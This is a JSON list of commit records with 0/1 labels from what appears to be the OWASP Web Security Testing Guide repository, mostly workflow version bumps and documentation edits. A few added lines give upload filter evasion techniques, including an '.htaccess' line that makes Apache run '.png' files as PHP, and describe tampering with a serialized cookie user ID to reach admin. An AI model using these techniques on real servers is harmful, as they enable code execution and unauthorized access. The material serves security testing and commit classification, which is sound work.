      ".github/workflows/comment.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+    permissions:\n+     contents: read\n+     pull-requests: write\n+         ",
    "label": 0
  },
  {
    "hash": "739e93717045fab93cee6287bb8dcd0a2f0fe40f",
    "message": "Bump the dependencies group with 2 updates (#1263)",
    "files": [
      ".github/workflows/build-ebooks.yml",
      ".github/workflows/comment.yml",
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+      uses: actions/upload-artifact@v6\n+        uses: actions/download-artifact@v7\n+      uses: actions/upload-artifact@v6\n+      uses: actions/upload-artifact@v6\n+      uses: actions/upload-artifact@v6",
    "label": 0
  },
  {
    "hash": "7cd94237fd514ec8c03a9da38f4e8c199a091588",
    "message": "Remove Google and Bing cache examples (#1261)",
    "files": [
      "document/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage.md",
      "document/4-Web_Application_Security_Testing/01-Information_Gathering/images/Google_cache_Operator_Search_Results_Example_20200406.png"
    ],
    "extensions": [
      "png",
      "md"
    ],
    "added_lines": "",
    "label": 1
  },
  {
    "hash": "6af9a59f74c66c83b77e23c4d21705e00c6bdf84",
    "message": "Fix incorrect terminology (#1260)",
    "files": [
      "document/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+For example, here is the response to a request for the non-existent HTTP version `SANTA CLAUS` from an Apache server.",
    "label": 0
  },
  {
    "hash": "c9c384dcd1599e719ca1b8fc9b3d8d8a8e30c598",
    "message": "Correct schema reference in origin security section (#1258)",
    "files": [
      "document/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+The origin is made up of a scheme, host name, and port. It uniquely identifies the domain sending or receiving the message, and does not include the path or the fragment part of the URL. For instance, `https://example.com` will be considered different from `http://example.com` because the schema of the former is `https`, while the latter is `http`. This also applies to web servers running in the same domain but on different ports.",
    "label": 1
  },
  {
    "hash": "9cd781bd67146ba1d8db65cccdc298d460bb97bb",
    "message": "Bump actions/checkout from 5 to 6 in the dependencies group (#1257)",
    "files": [
      ".github/workflows/build-checklists.yml",
      ".github/workflows/build-ebooks.yml",
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+      uses: actions/checkout@v6\n+      uses: actions/checkout@v6\n+      uses: actions/checkout@v6\n+      uses: actions/checkout@v6\n+      uses: actions/checkout@v6\n+      uses: actions/checkout@v6",
    "label": 0
  },
  {
    "hash": "0847e3740175a09983f11935adcb2c1bb1d3792a",
    "message": "Address Google cache no longer available (#1255)",
    "files": [
      "document/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+Testers can use search engines to perform reconnaissance on sites and web applications. There are direct and indirect elements to search engine discovery and reconnaissance: direct methods relate to searching the indices and the associated content from caches, while indirect methods relate to learning sensitive design and configuration information by searching forums, newsgroups, and tendering sites.\n+Once a search engine robot has completed crawling, it commences indexing the web content based on tags and associated attributes, such as `<TITLE>`, in order to return relevant search results. If the `robots.txt` file is not updated during the lifetime of the site, and in-line HTML meta tags that instruct robots not to index content have not been used, then it is possible for indices to contain web content not intended to be included by the owners. Site owners may use the previously mentioned `robots.txt`, HTML meta tags, authentication, and tools provided by search engines to remove such content.\n+#### Internet Archive Wayback Machine\n+\n+The [Internet Archive Wayback Machine](https://archive.org/web/) is the most comprehensive tool for viewing historical snapshots of web pages. It maintains an extensive archive of web pages dating back to 1996.\n+\n+To view archived versions of a site, visit `https://web.archive.org/web/*/`\n+followed by the target URL:\n+\n+```text\n+https://web.archive.org/web/*/owasp.org\n+```\n+\n+This will display a calendar view showing all available snapshots of the site over time.\n+\n+#### Bing Cache\n+\n+Bing still provides cached versions of web pages. To view cached content, use the `cache:` operator:\n+Alternatively, click the arrow next to search results in Bing and select \"Cached\" from the dropdown menu.\n+\n+#### Other Cached Content Services\n+\n+Additional services for viewing cached or archived web pages include:\n+\n+- [archive.ph](https://archive.ph) (also known as archive.md) - On-demand archiving service that creates permanent snapshots\n+- [CachedView](https://cachedview.com/) - Aggregates cached pages from multiple sources including Google Cache historical data, Wayback Machine, and others\n+",
    "label": 1
  },
  {
    "hash": "4a4a3f6e5d439c2d7d05443444ff9ac100eb5e2f",
    "message": "Fix typo in reporting structure guide (#1252)",
    "files": [
      "document/5-Reporting/01-Reporting_Structure.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+This guide provides only suggestions about one possible approach to reporting, and should not be treated as strict rules that must be followed. When considering any of the recommendations below, always ask yourself whether the recommendation would improve your report.",
    "label": 0
  },
  {
    "hash": "39ebc884b157a2f75a18a4ea5fd32c60f0e7c823",
    "message": "Update 08-Fingerprint_Web_Application_Framework.md (#1244)",
    "files": [
      "document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+| Tiny File Manager | filemanager                  |\n+| Zenphoto     | zenphoto_auth                     |\n+Site: [https://github.com/urbanadventurer/WhatWeb](https://github.com/urbanadventurer/WhatWeb)\n+Site: [https://www.wappalyzer.com/](https://www.wappalyzer.com/)",
    "label": 1
  },
  {
    "hash": "a5cc07d09ff4e78f042024ca0d26ec89873d0322",
    "message": "Update README.md (#1251)",
    "files": [
      "README.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+[![Twitter Follow](https://img.shields.io/twitter/follow/owasp_wstg?style=social)](https://x.com/owasp_wstg)\n+You can @ us on \ud835\udd4f (Twitter) [@owasp_wstg](https://x.com/owasp_wstg).",
    "label": 0
  },
  {
    "hash": "80f81824f675501c19086f64f35271e2a6c596eb",
    "message": "Bump the dependencies group with 2 updates (#1250)",
    "files": [
      ".github/workflows/build-ebooks.yml",
      ".github/workflows/comment.yml",
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+      uses: actions/upload-artifact@v5\n+        uses: actions/download-artifact@v6\n+      uses: actions/upload-artifact@v5\n+      uses: actions/upload-artifact@v5\n+      uses: actions/upload-artifact@v5",
    "label": 0
  },
  {
    "hash": "518d0dcab364e0c2aa270f7633064381981981ca",
    "message": "fix: Broken link for pentest.co.uk (#1249)",
    "files": [
      "document/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+[Penetration Testing Framework](https://web.archive.org/web/20130925044437/http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html)\n+- [PCI Data Security Standard - Penetration Testing Guidance](https://www.pcisecuritystandards.org/documents/Penetration-Testing-Guidance-v1_1.pdf)\n+- [Penetration Testing Framework 0.59 (Archived)](https://web.archive.org/web/20130925044437/http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html)",
    "label": 0
  },
  {
    "hash": "63fbe5bfb3b93ba4f3edfb0bd02e75429a3be5ce",
    "message": "Bump actions/setup-node from 5 to 6 in the dependencies group (#1247)",
    "files": [
      ".github/workflows/build-checklists.yml",
      ".github/workflows/build-ebooks.yml",
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+      uses: actions/setup-node@v6\n+      uses: actions/setup-node@v6\n+      uses: actions/setup-node@v6\n+      uses: actions/setup-node@v6\n+      uses: actions/setup-node@v6",
    "label": 0
  },
  {
    "hash": "6e6096399ef25922f6d7498597e26bbf5f38897f",
    "message": "Update README.md (#1246)",
    "files": [
      "document/1-Frontispiece/README.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+- Olivier Konat\u00e9",
    "label": 0
  },
  {
    "hash": "30b74b0c561476aa728719b46d91ed89c8d37ba1",
    "message": "Update 02-Fingerprint_Web_Server.md (#1245)",
    "files": [
      "document/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+As default error pages offer many differentiating factors between types of web servers, their examination can be an effective method for fingerprinting even when server header fields are obscured.  \n+Furthermore, this [resource](https://0xdf.gitlab.io/cheatsheets/404) can be handy, especially when you come across default error pages that do not disclose the web server type.",
    "label": 1
  },
  {
    "hash": "37d620254f1a1f5b6291d5cdaba77ae37996c26e",
    "message": "Update 01-Testing_for_Weak_Transport_Layer_Security.md (#1242)",
    "files": [
      "document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+- [CWE-1428: Reliance on HTTP instead of HTTPS](https://cwe.mitre.org/data/definitions/1428.html)",
    "label": 1
  },
  {
    "hash": "8dc8ac963158a51a24b3ffc00086180bbbff1f06",
    "message": "Add new filter evasion techniques (WSTG-BUSL-09) (#1240)",
    "files": [
      "document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types.md",
      "document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+Vulnerabilities related to the upload of unexpected file types is unique in that the upload should quickly reject a file if it does not have a specific extension. Additionally, this is different from uploading malicious files in that in most cases an incorrect file format may not by it self be inherently \"malicious\" but may be detrimental to the saved data. For example if an application accepts Windows Excel files, if a similar database file is uploaded it may be read but data extracted may be moved to incorrect locations.\n+- Use double extensions such as `file.jpg.php` or `file.png.php`. For this to work properly, you must first understand how the web server handles files with multiple extensions. For instance, in certain scenario, the web server may only check if `.jpg` or `.png` is part of the file's extension which may allow attackers to bypass file extension filter.\n+- Change the [file signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or magic byte of the uploaded file.\n+- Upload an `.htaccess` file with the following content: `AddType application/x-httpd-php .png`. This will cause the Apache server to execute `.png` images as if they were `.php` resources.\n+\n+**Note that in some situations, you may need to combine the different filter evasion techniques discussed above in order to successfully bypass server-side filters.**\n+- [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)",
    "label": 1
  },
  {
    "hash": "13ce2c41dd2fb69468b121715586601a22554b28",
    "message": "Update 01-Testing_for_Weak_Transport_Layer_Security.md (#1238)",
    "files": [
      "document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+- NULL ciphers ([they only provide authentication](https://tools.ietf.org/html/rfc4785)).\n+The [Mozilla Server-Side TLS Guide](https://wiki.mozilla.org/Security/Server_Side_TLS) details the protocols and ciphers that are currently recommended.\n+In order to defend against this type of attack, the site must be added to the [preload list](https://hstspreload.org).\n+- [Mozilla Server-Side TLS Guide](https://wiki.mozilla.org/Security/Server_Side_TLS)",
    "label": 1
  },
  {
    "hash": "ab67f5b30fa894a97045ea1340b81c2dd992c8d4",
    "message": "Node to v24 in workflows (#1239)",
    "files": [
      ".github/workflows/build-checklists.yml",
      ".github/workflows/build-ebooks.yml",
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+        node-version: 24\n+        node-version: 24\n+        node-version: 24\n+        node-version: 24\n+        node-version: 24",
    "label": 0
  },
  {
    "hash": "717c78a5b276dff1abf99509148f20fcffb60cc5",
    "message": "Bump the dependencies group with 3 updates (#1237)",
    "files": [
      ".github/workflows/build-checklists.yml",
      ".github/workflows/build-ebooks.yml",
      ".github/workflows/comment.yml",
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+      uses: actions/setup-node@v5\n+      uses: actions/setup-python@v6\n+      uses: actions/setup-node@v5\n+      uses: actions/setup-python@v6\n+        uses: actions/github-script@v8\n+      uses: actions/setup-node@v5\n+      uses: actions/setup-node@v5\n+      uses: actions/setup-node@v5",
    "label": 0
  },
  {
    "hash": "f70d4c148d8d1c0b4d668e528cd165f6f79e8d5e",
    "message": "Bump ncipollo/release-action in the dependencies group (#1236)",
    "files": [
      ".github/workflows/build-ebooks.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+      uses: ncipollo/release-action@b7eabc95ff50cbeeedec83973935c8f306dfcd0b # v1.20.0",
    "label": 0
  },
  {
    "hash": "5c40ef0b1832b5ef34d754770b2d8f86f6c72b99",
    "message": "Bump ncipollo/release-action in the dependencies group (#1234)",
    "files": [
      ".github/workflows/build-ebooks.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+      uses: ncipollo/release-action@98d25d4189e9b6cee19b8635b1ea5cc39c158a41 # v1.19.2",
    "label": 0
  },
  {
    "hash": "3c3ef8b9c51f6dc55ae661c9f73a9cf4fbdf3e76",
    "message": "Publish Latest checklists 2025-09-03 (#1235)",
    "files": [
      "checklists/README.md",
      "checklists/checklist.json",
      "checklists/checklist.xlsx"
    ],
    "extensions": [
      "json",
      "md",
      "xlsx"
    ],
    "added_lines": "+SHA-256: 96e7842efd9ac2937ac65ce86613a791f0f428dcd6f1e04e2afc632a719248c3\n+                    \"Assess if unauthenticated, horizontal, or vertical access is possible.\"",
    "label": 0
  },
  {
    "hash": "a1d9cc80918fe41c7e01381153593ded5f7ae83b",
    "message": "Issue 1226: moving this section from WSTG-ATHN-04 to WSTG-ATHZ-02 (#1232)",
    "files": [
      "document/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema.md",
      "document/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema.md",
      "document/4-Web_Application_Security_Testing/05-Authorization_Testing/images/Basm-directreq.jpg"
    ],
    "extensions": [
      "jpg",
      "md"
    ],
    "added_lines": "+*Figure 4.4.4-1: Parameter Modified Request*\n+*Figure 4.4.4-2: Cookie Values Over Time*\n+*Figure 4.4.4-3: Partially Changed Cookie Values*\n+*Figure 4.4.4-4: SQL Injection*\n+*Figure 4.4.4-5: Simple SQL Injection Attack*\n+2. `userid` is now set to the admin ID: this can be seen in the last piece of the string, where we replaced our regular user ID (`s:4:\"1337\"`) with `s:1:\"2\"`\n+- Assess if unauthenticated, horizontal, or vertical access is possible.\n+- Access resources and conduct operations without login. - Direct page request ([forced browsing](https://owasp.org/www-community/attacks/Forced_browsing))\n+### Testing for Basic Unauthenticated Access\n+\n+#### Using a Browser Manually\n+\n+When a web application does not properly enforce access control mechanisms, sensitive resources become exposed, allowing unauthenticated users to view them. For example, if a user directly requests a different page via forced browsing, that page may not check the authorization of the anonymous user before granting access. Attempt to directly access a protected page through the address bar in your browser to test using this method.\n+\n+![Direct Request to Protected Page](images/Basm-directreq.jpg)\\\n+*Figure 4.5.2-1: Direct Request to Protected Page*\n+\n+#### Using Automation\n+\n+This process can be automated if you have a list of all endpoints with tools like ffuf, gobuster, ZAP, and Burp Suite Intruder.\n+\n+For ZAP, using a adddon for [Access Control Testing](https://www.zaproxy.org/docs/desktop/addons/access-control-testing/) allows testers to determine which parts of the application are available to anonymous users, and identify potential access control issues.\n+\n+For Burp Suite, built-in tools such as Intruder, and a number of plugins, including Autorize, help the tester automate testing authorization.\n+",
    "label": 1
  },
  {
    "hash": "40bc7df4937a79a0697ec4629cb836c75e5d60bc",
    "message": "Update 16-Testing_for_HTTP_Incoming_Requests.md (#1233)",
    "files": [
      "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+There are situations where we would like to monitor all HTTP incoming requests on the web server but we can't change the configuration on the browser or application client-side. In this scenario, we can setup a reverse proxy on the web server and to monitor all incoming/outgoing requests on the web server.",
    "label": 1
  }
]